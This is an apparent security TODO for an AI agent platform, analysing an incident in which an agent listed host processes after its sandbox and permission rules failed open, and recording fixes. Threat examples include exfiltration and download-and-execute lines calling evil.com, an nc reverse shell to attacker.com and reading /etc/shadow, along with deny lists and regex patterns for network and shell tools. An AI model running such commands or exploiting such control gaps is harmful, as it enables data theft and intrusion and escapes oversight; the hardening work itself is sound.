# Security TODO

**Created:** 2026-01-09
**Updated:** 2026-01-09 (Fixes 1-3 implemented + Container restart required)
**Status:** Critical fixes applied - Container restart needed after code changes

This document identifies security weaknesses, potential vulnerabilities, and exploitation risks in the Agentum security architecture. Items are prioritized by severity.

---

## ✅ FIXED - Critical Issues Resolved (2026-01-09)

### 0. INCIDENT ANALYSIS: Agent Bypassed All Security Controls

**Date:** 2026-01-08
**Session:** `20260108_225959_2f274fc4`
**Impact:** Agent executed `ps aux` and exposed ALL HOST PROCESSES to the user.

**STATUS: ROOT CAUSES HAVE BEEN FIXED**

| # | Issue | Fix Applied |
|---|-------|-------------|
| 1 | `dangerous_command_hook` not active | ✅ FIXED: Added `DANGEROUS_COMMAND_PATTERNS` directly to `create_permission_callback()` in `permissions.py`. Dangerous commands (ps, kill, curl, etc.) are now blocked BEFORE permission rules are checked. |
| 2 | Sandbox fails open to unsandboxed execution | ✅ FIXED: Changed to FAIL-CLOSED design in `permissions.py`. If bwrap fails, Bash commands are now DENIED with error message. |
| 3 | `Bash(*)` allow rule defeats deny rules | ✅ FIXED: Changed `permission_config.py` to check deny rules FIRST. Deny patterns now take precedence over allow patterns. |
| 4 | bwrap not installed | ⚠️ DEPLOYMENT: Install bubblewrap on macOS hosts |
| 5 | Volume mount requires container restart | ⚠️ NOTE: `./src:/src` volume mount means code changes are visible but Python doesn't reload. **Must restart container** after code changes: `docker-compose restart agentum-api` |

**New Code Flow After Fix:**

```
Agent requests: Bash("ps aux")
        │
        ▼
create_permission_callback() called
        │
        ▼
STEP 1: Check DANGEROUS_COMMAND_PATTERNS
  "\bps\b" matches "ps aux" ✓
        │
        ▼
Returns DENY immediately with interrupt=True ✓
        │
        ▼
Command BLOCKED - "Blocked dangerous command pattern: \bps\b"
```

---

### ~~1. Dangerous Command Hook Not Registered~~ ✅ FIXED

**Fixed in:** `permissions.py`

**Implementation:** Added `DANGEROUS_COMMAND_PATTERNS` list and blocking logic directly to `create_permission_callback()`. This provides defense-in-depth regardless of whether hooks are registered.

**Code added:**
- `DANGEROUS_COMMAND_PATTERNS` constant with 35+ patterns including `ps`, `kill`, `sudo`, `curl`, `wget`, `nc`, etc.
- Blocking check BEFORE permission rules are evaluated
- Returns `PermissionResultDeny` with `interrupt=True` for any match

---

### ~~2. Sandbox Failure Degrades to Unsandboxed Execution~~ ✅ FIXED

**Fixed in:** `permissions.py`

**Implementation:** Changed exception handler to FAIL-CLOSED design:

```python
except Exception as e:
    # SECURITY: FAIL-CLOSED - if sandbox fails, DENY the command
    security_msg = f"Sandbox unavailable (bwrap error: {e}). Bash commands are blocked for security."
    return PermissionResultDeny(
        behavior="deny",
        message=security_msg,
        interrupt=True
    )
```

---

### ~~3. Allow Rule Precedence Defeats Deny Rules~~ ✅ FIXED

**Fixed in:** `permission_config.py`

**Implementation:** Changed `is_tool_allowed()` to check deny rules FIRST:

```python
# SECURITY: Check deny rules FIRST - explicit denies always win
for pattern in config.permissions.deny:
    if self._matches_pattern(tool_call, pattern):
        return False  # Denied

# Check allow rules - if not denied, check if explicitly allowed
for pattern in config.permissions.allow:
    if self._matches_pattern(tool_call, pattern):
        return True  # Allowed

return False  # Default deny
```

---

## 🔴 CRITICAL - Still Requires Attention

### 3. Allow Rule Precedence Defeats All Deny Rules

**Location:** `permission_config.py` lines 725-741, `permissions.yaml` line 56

**Current behavior:**
```yaml
allow:
  - Bash(*)      # Line 56 - Matches EVERYTHING
deny:
  - Bash(ps *)   # Line 108 - NEVER REACHED!
  - Bash(kill *)
  - Bash(mount *)
  ...
```

The permission check order is:
1. Check allow rules FIRST
2. If ANY allow rule matches → return ALLOW immediately
3. Deny rules are NEVER checked if allow matches

**Why `Bash(*)` exists:** The intent was to allow bash commands while relying on:
1. The sandbox for isolation
2. The dangerous_command_hook for blocking specific commands

But since the hook isn't registered and sandbox can fail, this is catastrophic.

**Fix Required (choose one):**

**Option A - Remove `Bash(*)` and explicitly allow safe commands:**
```yaml
allow:
  # Explicitly list allowed bash commands
  - Bash(ls *)
  - Bash(cat *)
  - Bash(echo *)
  - Bash(mkdir *)
  - Bash(touch *)
  - Bash(python *)
  - Bash(pip *)
  - Bash(git *)
  # ... be explicit about what's allowed
```

**Option B - Check deny rules FIRST:**
```python
# In permission_config.py is_tool_allowed()
# Check deny rules FIRST
for pattern in config.permissions.deny:
    if self._matches_pattern(tool_call, pattern):
        return False  # Explicitly denied

# Then check allow rules
for pattern in config.permissions.allow:
    if self._matches_pattern(tool_call, pattern):
        return True

return False  # Default deny
```

**Option C - Make sandbox failure abort the entire agent:**
If sandbox is unavailable, refuse to start the agent at all.

---

### 4. Network Access Enabled by Default in Sandbox

**Location:** `config/permissions.yaml` lines 145-148

```yaml
network:
  enabled: true
  allowed_domains: []  # Empty = ALL domains allowed
  allow_localhost: true
```

**Risk:** Agent can make arbitrary HTTP/HTTPS requests, enabling:
- **Data exfiltration:** Upload session data, API keys, user tasks to external servers
- **SSRF attacks:** Access internal services, cloud metadata endpoints (169.254.169.254)
- **Download & execute:** Fetch malicious payloads and execute them
- **Reverse shells:** Establish outbound connections to attacker-controlled servers

**Exploitation Example:**
```bash
# Agent could execute:
curl -X POST https://evil.com/exfil -d "$(cat /workspace/*)"
wget https://evil.com/backdoor.sh -O /tmp/x && bash /tmp/x
```

**Recommendation:**
- Set `network.enabled: false` by default
- If network is needed, enforce a strict `allowed_domains` whitelist
- Block `allow_localhost` to prevent SSRF to internal services
- Add network egress monitoring/logging

---

### 2. Missing Critical Command Blocking Patterns

**Location:** `config/permissions.yaml` deny list and `hooks.py` dangerous_command_hook

**Not blocked:**
| Command | Risk | Attack Vector |
|---------|------|---------------|
| `sudo *` | Privilege escalation | `sudo bash`, `sudo cat /etc/shadow` |
| `curl`, `wget` | Data exfiltration, payload download | With network enabled, trivial exfil |
| `python -c`, `python3 -c` | Arbitrary code execution | Bypass command filtering |
| `nc`, `ncat`, `netcat` | Reverse shell | `nc -e /bin/bash attacker.com 4444` |
| `chmod`, `chown` | Prepare for privilege escalation | `chmod +s /workspace/suid_binary` |
| `eval`, `exec` | Command injection | Bypass pattern matching |
| `base64 -d \| bash` | Encoded payload execution | Evade command detection |
| `$(...)`, `` `...` `` | Command substitution in args | Inject into allowed commands |
| `env`, `printenv` | Environment reconnaissance | Leak API keys if env not cleared |
| `cat /proc/self/environ` | Environment variable leak | Even with `/proc/` blocked, variations exist |

**Recommendation:**
Add to `permissions.yaml` deny list:
```yaml
deny:
  - Bash(sudo *)
  - Bash(curl *)
  - Bash(wget *)
  - Bash(python -c *)
  - Bash(python3 -c *)
  - Bash(nc *)
  - Bash(ncat *)
  - Bash(netcat *)
  - Bash(chmod *)
  - Bash(chown *)
```

Add to `dangerous_command_hook` patterns:
```python
r"\bsudo\b",
r"\bcurl\b",
r"\bwget\b",
r"\bncat\b",
r"\bnetcat\b",
r"\bnc\s+-",  # nc with flags
r"\bpython[23]?\s+-c\b",
r"\bperl\s+-e\b",
r"\bruby\s+-e\b",
r"\beval\b",
r"\bexec\b",
r"base64.*\|.*(?:bash|sh)",
r"\$\(",  # Command substitution
r"`[^`]+`",  # Backtick command substitution
```

---

### 3. No User Namespace Isolation

**Location:** `sandbox.py` - bwrap configuration

**Risk:** Bubblewrap runs processes as the same UID/GID as the host. If the server runs as root:
- Root inside sandbox = Root outside sandbox
- Sandbox escape via capabilities or mount tricks

**Current state:**
```python
# sandbox.py - No --unshare-user flag
cmd.extend([
    "--unshare-pid",
    "--unshare-uts",
    "--unshare-ipc",
])
# Missing: "--unshare-user"
```

**Recommendation:**
- **Never run the Agentum server as root**
- Add `--unshare-user` when not in Docker (Docker already has user namespaces)
- Document required non-root deployment in production docs
- Add startup check that refuses to run as root

---

### 4. WebFetch/WebSearch Enabled Without Domain Restrictions

**Location:** `config/permissions.yaml` lines 22-23

```yaml
tools:
  enabled:
    - WebFetch
    - WebSearch
```

Combined with:
```yaml
network:
  allowed_domains: []  # Empty = unrestricted
```

**Risk:** Agent can fetch arbitrary URLs, leading to:
- SSRF to internal services
- Fetching malicious content
- Data exfiltration via GET parameters

**Recommendation:**
- Remove `WebFetch` and `WebSearch` from enabled tools, OR
- Enforce a strict `allowed_domains` whitelist
- Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)

---

## 🟠 HIGH - Address Soon

### 5. Network Sandboxing Disabled in Docker

**Location:** `sandbox.py` line 195-196

```python
# Network isolation only works outside Docker
if not allow_network and config.network_sandboxing and not nested_container:
    cmd.append("--unshare-net")
```

**Risk:** When running in Docker (common deployment), network isolation is completely disabled. Agent has full network access.

**Recommendation:**
- Document this limitation prominently
- Consider Docker network policies as compensating control
- Implement application-level egress filtering
- Use Docker `--network=none` for the container

---

### 6. Allow Rules Take Precedence Over Deny Rules

**⚠️ See CRITICAL item #3 above for detailed analysis and fix.**

**Summary:** The `Bash(*)` allow pattern matches all bash commands before deny rules are checked, making the deny list ineffective. This was a contributing factor in the 2026-01-08 incident.

---

### 7. JWT Secret Never Rotates

**Location:** `auth_service.py` lines 42-77

**Risk:**
- Long-lived secret (forever until manual change)
- Compromised secret = all tokens compromised
- No way to revoke all tokens except manual secret change + restart

**Recommendation:**
- Implement secret rotation mechanism
- Add token revocation capability (blacklist or short-lived + refresh tokens)
- Store issued tokens with metadata for selective revocation

---

### 8. Session Data Persisted Unencrypted

**Location:** `sessions/` directory

Files stored in plaintext:
- `session_info.json` - Contains task descriptions (potentially sensitive)
- `agent.jsonl` - Full conversation logs
- `workspace/` - Task outputs, generated files

**Risk:** Server compromise exposes all historical session data.

**Recommendation:**
- Consider encryption at rest for session data
- Implement session data retention policy
- Provide session deletion API for users

---

### 9. Skills Directory Shared Between Sessions

**Location:** File structure, `workspace/skills -> ../../../skills` symlink

**Risk:**
- Session A could leave malicious content in skills (if symlink resolves incorrectly)
- Information leakage if skills contain sensitive data

**Recommendation:**
- Ensure symlink always resolves to read-only location
- Validate symlink target on session creation
- Consider per-session skill copies for sensitive deployments

---

## 🟡 MEDIUM - Address When Possible

### 10. No API Rate Limiting

**Location:** All API routes

**Risk:**
- DoS via API flooding
- Brute-force attacks on tokens
- Resource exhaustion via session creation spam

**Recommendation:**
- Add rate limiting middleware (e.g., `slowapi`)
- Limit concurrent sessions per user
- Limit API requests per minute

---

### 11. No Audit Log Protection

**Location:** `logs/backend.log`

**Risk:**
- Logs could be tampered with to hide attack evidence
- Logs may contain sensitive data
- No log rotation = disk exhaustion

**Recommendation:**
- Implement log rotation
- Forward logs to remote SIEM
- Exclude or redact sensitive data from logs

---

### 12. SQLite Single-Writer Limitation

**Location:** `data/agentum.db`

**Risk:**
- Database corruption under high concurrency
- Performance bottleneck
- No replication/backup mechanism

**Recommendation:**
- For production: Migrate to PostgreSQL
- Implement regular backup mechanism
- Add database health checks

---

### 13. Path Normalization Hook Not Active

**Location:** `hooks.py` - `create_path_normalization_hook()` exists but not registered

**Risk:** Inconsistent behavior - absolute paths in workspace are blocked instead of normalized, which may confuse users/agents.

**Recommendation:**
- Either enable the hook for consistent behavior, OR
- Remove the dead code to avoid confusion

---

### 14. Missing Input Validation on Session IDs

**Location:** `session_service.py` - Session ID validation regex

Current validation:
```python
SESSION_ID_PATTERN = re.compile(r"^\d{8}_\d{6}_[a-f0-9]{8}$")
```

**Risk:** While format is validated, additional path traversal checks rely on this. Any bypass could lead to directory traversal.

**Recommendation:**
- Add additional canonicalization checks
- Resolve and verify paths don't escape base directory
- Consider using UUIDs only (no timestamp prefix)

---

### 15. Symlink Race Conditions

**Location:** `agent_core.py` `_setup_workspace_skills()`

```python
# Creates symlink: workspace/skills -> ../../../skills
skills_link.symlink_to("../../../skills")
```

**Risk:** TOCTOU (time-of-check-time-of-use) race conditions possible if symlink is replaced between creation and use.

**Recommendation:**
- Use atomic symlink operations
- Verify symlink target at use time, not just creation
- Consider bind mounts instead of symlinks

---

## 📋 Hardening Checklist

Before production deployment, verify:

- [ ] Network access disabled or strictly whitelisted
- [x] `sudo`, `curl`, `wget`, `nc` commands blocked (via DANGEROUS_COMMAND_PATTERNS)
- [ ] Server running as non-root user
- [ ] Docker network policies configured (if containerized)
- [ ] JWT secret stored securely (not in version control)
- [ ] Rate limiting enabled
- [ ] Log forwarding configured
- [ ] Database backup scheduled
- [ ] Session data retention policy implemented
- [ ] Security audit of skills directory content
- [ ] Sandbox (bwrap) installed and verified working
- [x] dangerous_command_hook verified active in hook pipeline (via DANGEROUS_COMMAND_PATTERNS in permissions.py)
- [x] Fail-closed sandbox behavior verified (bwrap failure = command blocked)

---

## 🚨 IMMEDIATE ACTION REQUIRED

Based on the 2026-01-08 incident, the following fixes have been or must be implemented:

### Priority 1 - Code Changes ✅ COMPLETED

| # | Action | File | Status |
|---|--------|------|--------|
| 1 | **Make sandbox failure BLOCK commands** (fail-closed) | `permissions.py` | ✅ DONE |
| 2 | **Add pattern check for dangerous commands** | `permissions.py` | ✅ DONE |
| 3 | **Fix allow/deny precedence** - check deny rules FIRST | `permission_config.py` | ✅ DONE |

### Priority 2 - Configuration Changes (RECOMMENDED)

| # | Action | File | Notes |
|---|--------|------|-------|
| 4 | Remove `Bash(*)` from allow list | `permissions.yaml` | Optional - deny rules now take precedence |
| 5 | Set `network.enabled: false` default | `permissions.yaml` | Require explicit opt-in |
| 6 | Document required bwrap installation | README, deployment docs | |

### Priority 3 - Deployment

| # | Action | Notes |
|---|--------|-------|
| 7 | Install bubblewrap on all hosts | `apt install bubblewrap` or build from source on macOS |
| 8 | Verify sandbox works before deploying | Run test command with bwrap |
| 9 | Add monitoring for sandbox failures | Log analysis for sandbox-related messages |

---

## Testing After Fixes

After implementing fixes, verify with these tests:

```bash
# Test 1: ps command should be blocked
curl -X POST http://localhost:40080/sessions/{id}/stream \
  -d '{"task": "run ps aux"}' | grep -i "blocked\|denied"

# Test 2: Sandbox failure should block, not degrade
# (Remove bwrap temporarily and verify commands are denied)

# Test 3: Network commands should be blocked
curl -X POST http://localhost:40080/sessions/{id}/stream \
  -d '{"task": "run curl https://example.com"}' | grep -i "blocked\|denied"
```

---

## References

- [Bubblewrap security considerations](https://github.com/containers/bubblewrap/blob/main/SECURITY.md)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Fail-Safe vs Fail-Secure Design](https://owasp.org/www-community/Fail_securely)